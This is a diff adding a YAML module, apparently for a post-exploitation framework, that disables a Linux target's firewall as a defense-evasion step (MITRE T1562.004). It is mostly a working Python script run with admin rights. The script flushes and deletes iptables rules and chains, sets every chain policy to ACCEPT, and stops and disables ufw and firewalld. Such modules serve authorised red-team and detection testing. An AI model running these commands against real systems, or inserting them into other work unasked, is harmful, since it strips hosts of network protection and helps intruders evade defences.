@@ -1,0 +1,66 @@
+name: disable_firewall
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Disables the system firewall on a Linux target. Attempts multiple
+  methods to ensure coverage across distributions: flushes iptables
+  rules, disables ufw (Uncomplicated Firewall), and stops the
+  firewalld service. Also attempts to stop ufw via systemctl.
+software: ''
+tactics: [TA0005]
+techniques: [T1562.004]
+background: false
+output_extension: ''
+needs_admin: true
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: Firewall to disable (all, iptables, ufw, firewalld).
+    required: true
+    value: 'all'
+    suggested_values:
+      - all
+      - iptables
+      - ufw
+      - firewalld
+script: |
+  import subprocess
+
+  method = '{{ Method }}'.strip().lower() or 'all'
+  results = []
+
+  def try_cmd(cmd, desc):
+      try:
+          proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+          output, stderr = proc.communicate()
+          output = output.decode('utf-8', errors='replace')
+          stderr = stderr.decode('utf-8', errors='replace')
+          if proc.returncode != 0:
+              results.append('[-] {}: failed (exit {}): {}'.format(desc, proc.returncode, stderr.strip() or output.strip()))
+          else:
+              results.append('[+] {}: {}'.format(desc, output.strip() if output.strip() else 'OK'))
+      except Exception as e:
+          results.append('[-] {}: {}'.format(desc, str(e)))
+
+  if method in ('all', 'iptables'):
+      try_cmd('iptables -F', 'Flush iptables rules')
+      try_cmd('iptables -X', 'Delete iptables chains')
+      try_cmd('iptables -P INPUT ACCEPT', 'Set INPUT policy ACCEPT')
+      try_cmd('iptables -P FORWARD ACCEPT', 'Set FORWARD policy ACCEPT')
+      try_cmd('iptables -P OUTPUT ACCEPT', 'Set OUTPUT policy ACCEPT')
+
+  if method in ('all', 'ufw'):
+      try_cmd('ufw disable', 'Disable ufw')
+      try_cmd('systemctl stop ufw', 'Stop ufw via systemctl')
+
+  if method in ('all', 'firewalld'):
+      try_cmd('systemctl stop firewalld', 'Stop firewalld')
+      try_cmd('systemctl disable firewalld', 'Disable firewalld')
+
+  print('\n'.join(results))
